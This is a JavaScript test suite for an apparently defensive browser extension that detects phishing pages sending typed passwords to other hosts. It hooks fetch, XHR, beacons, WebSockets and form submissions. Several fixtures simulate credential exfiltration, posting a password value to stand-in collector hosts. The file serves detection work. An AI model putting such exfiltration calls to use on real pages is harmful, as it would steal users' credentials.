const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const root = path.resolve(__dirname, '..');
const manifest = JSON.parse(fs.readFileSync(path.join(root, 'manifest.json'), 'utf8'));
const read = name => fs.readFileSync(path.join(root, 'src', name), 'utf8');
const run = (ctx, name) => vm.runInContext(read(name), ctx, { filename: name });

async function policyContext(config = {}) {
  const registered = new Map();
  const changes = [];
  const errors = [];
  const chrome = {
    runtime: { getManifest: () => manifest },
    storage: {
      managed: { get: (_keys, cb) => queueMicrotask(() => cb(config)) },
      onChanged: { addListener: cb => changes.push(cb) }
    },
    scripting: {
      getRegisteredContentScripts: async ({ ids }) => ids.flatMap(id => registered.has(id) ? [registered.get(id)] : []),
      registerContentScripts: async scripts => scripts.forEach(s => {
        assert.equal(registered.has(s.id), false);
        registered.set(s.id, s);
      }),
      updateContentScripts: async scripts => scripts.forEach(s => {
        assert.equal(registered.has(s.id), true);
        registered.set(s.id, s);
      }),
      unregisterContentScripts: async ({ ids }) => ids.forEach(id => registered.delete(id))
    }
  };
  const ctx = vm.createContext({ chrome, console: { error: (...args) => errors.push(args) } });
  run(ctx, 'detector.js');
  run(ctx, 'hook-policy.js');
  await ctx.hookPolicyQueue;
  return { ctx, config, chrome, registered, errors, change: () => changes[0]({}, 'managed') };
}

test('CAPTCHA documents are excluded from every general content script', async () => {
  const p = await policyContext();
  const exclusions = manifest.content_scripts.filter(s => s.matches.includes('<all_urls>'));
  assert.equal(exclusions.length, 2);
  for (const script of exclusions) {
    assert.ok(script.exclude_matches.includes('https://challenges.cloudflare.com/*'));
    assert.ok(script.exclude_matches.includes('https://*.hcaptcha.com/*'));
    assert.notEqual(script.world, 'MAIN');
  }
  const hook = p.registered.get('aitm-exfil');
  assert.equal(hook.world, 'MAIN');
  assert.equal(hook.allFrames, false);
  assert.equal(hook.runAt, 'document_start');
  for (const url of exclusions[0].exclude_matches) assert.ok(hook.excludeMatches.includes(url));
  assert.ok(!hook.excludeMatches.includes('*://*.cloudflare.com/*'));
  assert.ok(hook.excludeMatches.includes('*://*.live.com/*'));
  assert.deepEqual(p.errors, []);
});

test('policy disables registration and safely re-enables with trusted IdP exclusions', async () => {
  const p = await policyContext({ enabled: false });
  assert.equal(p.registered.size, 0);
  Object.assign(p.config, { enabled: true, trustedAuthDomains: ['SSO.example.test.', '*', 'https://bad.test/path'] });
  p.change();
  await p.ctx.hookPolicyQueue;
  const hook = p.registered.get('aitm-exfil');
  assert.ok(hook.excludeMatches.includes('*://*.sso.example.test/*'));
  assert.ok(!hook.excludeMatches.includes('*://*.*/*'));
  p.config.behaviorMode = 'off';
  p.change();
  await p.ctx.hookPolicyQueue;
  assert.equal(p.registered.size, 0);
  p.config.behaviorMode = 'warn';
  p.change();
  p.change();
  await p.ctx.hookPolicyQueue;
  assert.equal(p.registered.size, 1);
  assert.deepEqual(p.errors, []);
});

test('policy read failure preserves previous registration and later updates recover', async () => {
  const p = await policyContext();
  p.chrome.runtime.lastError = { message: 'storage unavailable' };
  p.config.enabled = false;
  p.change();
  await p.ctx.hookPolicyQueue;
  assert.equal(p.registered.size, 1);
  assert.equal(p.errors.length, 1);
  delete p.chrome.runtime.lastError;
  p.change();
  await p.ctx.hookPolicyQueue;
  assert.equal(p.registered.size, 0);
});

test('detector reads nested closed roots without opening them, including the starting host', () => {
  const roots = new WeakMap();
  const element = () => ({ nodeType: 1, shadowRoot: null, querySelectorAll: () => [] });
  const host = element(), child = element();
  const outer = { querySelectorAll: () => [child] };
  const inner = { querySelectorAll: () => [] };
  roots.set(host, outer);
  roots.set(child, inner);
  const ctx = vm.createContext({ chrome: { dom: { openOrClosedShadowRoot: el => roots.get(el) || null } } });
  run(ctx, 'detector.js');
  assert.deepEqual(Array.from(ctx.AITMDetector.collectRoots(host)), [host, outer, inner]);
  assert.equal(host.shadowRoot, null);
  assert.equal(child.shadowRoot, null);
});

test('detector falls back to open roots when extension DOM API is unavailable', () => {
  const shadow = { querySelectorAll: () => [] };
  const host = { nodeType: 1, shadowRoot: shadow, querySelectorAll: () => [] };
  const ctx = vm.createContext({});
  run(ctx, 'detector.js');
  assert.deepEqual(Array.from(ctx.AITMDetector.collectRoots(host)), [host, shadow]);
});

function hookContext() {
  const ctx = vm.createContext({ URL, URLSearchParams, TextDecoder, EventTarget, Event, CustomEvent });
  vm.runInContext(`
    var window = new EventTarget(); window.top = window.self = window;
    var location = { hostname: 'portal.example.test', href: 'https://portal.example.test/' };
    var password = { value: 'sensitive-value', tagName: 'INPUT', getAttribute: n => n === 'type' ? 'password' : null };
    var document = new EventTarget();
    document.querySelector = s => s.includes('password') ? password : null;
    document.querySelectorAll = s => s === 'input[type="password"]' ? [password] : [];
    document.documentElement = { getAttribute: () => '', setAttribute() {} };
    document.getElementById = () => null;
    var signals = [];
    window.addEventListener('aitm:exfil', ev => signals.push(ev.detail));
    var fetchCalls = [], fetchResult = Promise.resolve('response');
    window.fetch = function fetch() { fetchCalls.push({ receiver: this, args: Array.from(arguments) }); return fetchResult; };
    class XMLHttpRequest {
      open() { this.openArgs = Array.from(arguments); return 'opened'; }
      send() { this.sendArgs = Array.from(arguments); return 'sent'; }
    }
    window.XMLHttpRequest = XMLHttpRequest;
    class Navigator { sendBeacon() { this.beaconArgs = Array.from(arguments); return true; } }
    class HTMLImageElement { get src() { return this.value; } set src(v) { this.value = v; } }
    class NativeWebSocket { constructor() { this.args = Array.from(arguments); } }
    Object.defineProperty(NativeWebSocket, 'OPEN', { value: 1, enumerable: true });
    window.WebSocket = NativeWebSocket;
    class FormData { forEach(cb) { cb(password.value, 'password'); } }
    var originalToString = Function.prototype.toString;
  `, ctx);
  run(ctx, 'exfil-hook.js');
  return ctx;
}

test('hooks preserve reflection, fetch result/receiver/arguments, XHR and beacon behavior', () => {
  const ctx = hookContext();
  assert.equal(vm.runInContext('Function.prototype.toString === originalToString', ctx), true);
  assert.equal(vm.runInContext(`window.fetch('https://challenges.cloudflare.com/test', {body: password.value}) === fetchResult`, ctx), true);
  assert.equal(vm.runInContext('fetchCalls[0].receiver === window', ctx), true);
  assert.equal(vm.runInContext('fetchCalls[0].args[1].body', ctx), 'sensitive-value');
  assert.equal(ctx.signals.length, 0);
  assert.equal(vm.runInContext(`var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://challenges.cloudflare.com/test', false)`, ctx), 'opened');
  assert.equal(vm.runInContext('xhr.send(password.value)', ctx), 'sent');
  assert.equal(vm.runInContext(`new Navigator().sendBeacon('https://challenges.cloudflare.com/test', password.value)`, ctx), true);
  assert.equal(ctx.signals.length, 0);
});

test('WebSocket keeps constructor errors, subclass identity, static constants and optional arguments', () => {
  const ctx = hookContext();
  assert.throws(() => vm.runInContext(`window.WebSocket('wss://portal.example.test/')`, ctx), /requires new/);
  assert.equal(vm.runInContext(`class Socket extends window.WebSocket {};
    var socket = new Socket('wss://portal.example.test/', undefined);
    socket instanceof Socket && socket instanceof window.WebSocket`, ctx), true);
  assert.equal(vm.runInContext('socket.args.length', ctx), 2);
  assert.equal(vm.runInContext('window.WebSocket.OPEN', ctx), 1);
});

test('request inspection respects typed-array offsets and still detects actual password exfiltration', () => {
  const ctx = hookContext();
  vm.runInContext(`
    var bytes = Uint8Array.from(Array.from(password.value + 'ok', c => c.charCodeAt(0)));
    window.fetch('https://collector.other.test/ingest', { body: bytes.subarray(password.value.length) });
  `, ctx);
  assert.equal(ctx.signals.length, 0, 'bytes outside the transmitted view must not trigger an alert');
  vm.runInContext(`window.fetch('https://collector.other.test/ingest', { body: bytes.subarray(0, password.value.length) })`, ctx);
  assert.equal(ctx.signals.length, 1);
  assert.equal(ctx.signals[0].containsPassword, true);
  assert.equal(JSON.stringify(ctx.signals).includes('sensitive-value'), false);
});

function submit(ctx, acknowledge) {
  vm.runInContext(`
    var button = { hasAttribute: n => n === 'formaction', getAttribute: () => 'https://collector.other.test/post' };
    var resumedWith;
    var form = {
      tagName: 'FORM', getAttribute: () => '/safe',
      querySelector: () => password,
      requestSubmit: submitter => { resumedWith = submitter; }
    };
    var submitEvent = new Event('submit', { cancelable: true });
    Object.defineProperty(submitEvent, 'target', { value: form });
    Object.defineProperty(submitEvent, 'submitter', { value: button });
  `, ctx);
  if (acknowledge) vm.runInContext(`window.addEventListener('aitm:exfil', ev => ev.preventDefault())`, ctx);
  return vm.runInContext('document.dispatchEvent(submitEvent)', ctx);
}

test('form is not blocked without an active warning listener', () => {
  const ctx = hookContext();
  assert.equal(submit(ctx, false), true);
  assert.equal(ctx.signals[0].containsPassword, true);
});

test('formaction exfil is blocked when acknowledged and resumes with the original submitter', () => {
  const ctx = hookContext();
  assert.equal(submit(ctx, true), false);
  vm.runInContext(`window.dispatchEvent(new Event('aitm:exfil-proceed'))`, ctx);
  assert.equal(vm.runInContext('resumedWith === button', ctx), true);
  // The stub did not dispatch a submit (like failed browser validation).
  // A later real attempt must be inspected again.
  assert.equal(vm.runInContext(`
    var nextSubmit = new Event('submit', { cancelable: true });
    Object.defineProperty(nextSubmit, 'target', { value: form });
    Object.defineProperty(nextSubmit, 'submitter', { value: button });
    document.dispatchEvent(nextSubmit);
  `, ctx), false);
  assert.equal(ctx.signals.length, 2);
});

for (const config of [{ enabled: false }, { behaviorMode: 'off' }, { muted: true }]) {
  test('inactive/muted isolated UI does not silently block: ' + JSON.stringify(config), async () => {
    const ctx = hookContext();
    ctx.chrome = {
      storage: {
        managed: { get: (_keys, cb) => cb(config) },
        local: { get: (_keys, cb) => cb({ aitm_exfil_mute: config.muted ? { 'portal.example.test': Date.now() + 60000 } : {} }) }
      }
    };
    run(ctx, 'exfil-content.js');
    await new Promise(resolve => setImmediate(resolve));
    assert.equal(submit(ctx, false), true);
  });
}
